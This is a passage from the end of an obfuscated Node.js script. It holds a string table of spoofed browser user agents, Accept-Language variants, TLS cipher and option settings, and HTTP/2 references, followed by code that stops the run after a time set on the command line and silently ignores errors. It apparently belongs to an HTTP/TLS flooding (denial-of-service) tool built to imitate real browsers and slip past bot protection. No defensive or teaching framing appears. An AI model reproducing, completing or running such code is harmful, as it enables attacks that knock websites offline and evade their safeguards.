'ig-NG,ig;q=0.8', 'rsa_pkcs1_sha512', 'Google', 'cs;q=0.5', 'random', 'SSL_OP_NO_SSLv3', 'GREASE:X25519:x25519', 'same-origin', "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1", 'SSL_OP_COOKIE_EXCHANGE', 'argv', 'SSL_OP_NO_TLSv1', 'te-IN,te;q=0.9', "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", 'GREASE:', "HTTP/1.1 200", "Windows NT 10.0", 'zh-HK,zh;q=0.9', 'rm-CH,rm;q=0.8', '3zmHpGN', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", 'sharedworker', '1735010bdJfdA', 'http2', 'substring', 'pre-check=0', 'ne-IN,ne;q=0.8', 'zh-CN,zh;q=0.9', 'xslt', '47642rlqJRz', 'tk-TM,tk;q=0.8', '3163370xBsLai', 'blue', 'setMaxListeners', 'Linux', "Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", '594812uTbJnp'];
  _0x16f4 = function () {
    return _0x4b2e6e;
  };
  return _0x16f4();
}
const StopScript = () => process[_0x1d4549(0x135)](0x1);
setTimeout(StopScript, args[_0x1d4549(0x1a7)] * 0x3e8);
process.on(_0x1d4549(0x172), _0x4c608c => {});
process.on(_0x1d4549(0x1b0), _0x5f250c => {});
